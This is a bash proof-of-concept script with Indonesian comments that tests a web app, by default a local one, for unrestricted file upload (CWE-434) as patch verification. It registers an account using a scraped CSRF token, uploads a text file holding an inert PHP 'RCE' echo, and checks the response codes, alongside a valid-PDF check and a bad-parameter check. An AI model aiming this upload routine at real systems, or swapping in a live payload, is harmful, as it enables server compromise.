#!/usr/bin/env bash
# ============================================================
# POC — File Upload Tanpa Validasi (CWE-434)
# Bukan .php; memakai file "berbahaya" tekstual untuk pembuktian,
# karena patch baru udah nolak selain PDF. Sebelum patch ini = upload apa aja.
# ============================================================
set -euo pipefail
BASE="${1:-http://127.0.0.1:8000}"
COOKIE="$(mktemp)"
REG_HTML="$(mktemp)"

echo "[*] Target : $BASE"

# Ambil CSRF + login/daftar
curl -s -c "$COOKIE" "$BASE/register" -o "$REG_HTML"
CSRF=$(grep -oP 'name="_token" value="\K[^"]+' "$REG_HTML" | head -1)
MAIL="poc_up_$(date +%s)@test.com"
curl -s -b "$COOKIE" -c "$COOKIE" "$BASE/register" \
  -d "_token=$CSRF&name=pocup&email=$MAIL&password=Password123!&password_confirmation=Password123!" \
  -o /dev/null

echo ""
echo "=== 1) Upload file sembarang (txt / spoof) sebelum validasi ==="
# teks polos — bukan eksekusi nyata, cuma bukti MIME nggak dicek
echo '<?php echo "RCE"; ?>' > /tmp/poc_upload.txt
# Bukti server-host file non-PDF kalau app masih rentan
curl -s -b "$COOKIE" -F "judul=POC" -F "minggu=1" \
  -F "file=@/tmp/poc_upload.txt;type=text/plain" \
  "$BASE/peserta/upload" \
  -o /dev/null -w "[+] Upload non-PDF HTTP %{http_code} (200/302 = RENTAN, 422/redirect-error = sudah divalidasi)\n"

echo ""
echo "=== 2) Upload file PDF valid 5MB (harus lolos sesudah patch) ==="
echo "PDF test" > /tmp/poc_test.pdf
curl -s -b "$COOKIE" -F "judul=POC-PDF" -F "minggu=2" \
  -F "file=@/tmp/poc_test.pdf;type=application/pdf" \
  "$BASE/peserta/upload" \
  -o /dev/null -w "[+] Upload PDF HTTP %{http_code}\n"

echo ""
echo "=== 3) Invalid parameter (minggu out of range) harus ditolak ==="
curl -s -b "$COOKIE" -F "judul=POC" -F "minggu=99" \
  -F "file=@/tmp/poc_test.pdf;type=application/pdf" \
  "$BASE/peserta/upload" \
  -o /dev/null -w "[+] Invalid minggu HTTP %{http_code}\n"

rm -f "$COOKIE" "$REG_HTML" /tmp/poc_upload.txt /tmp/poc_test.pdf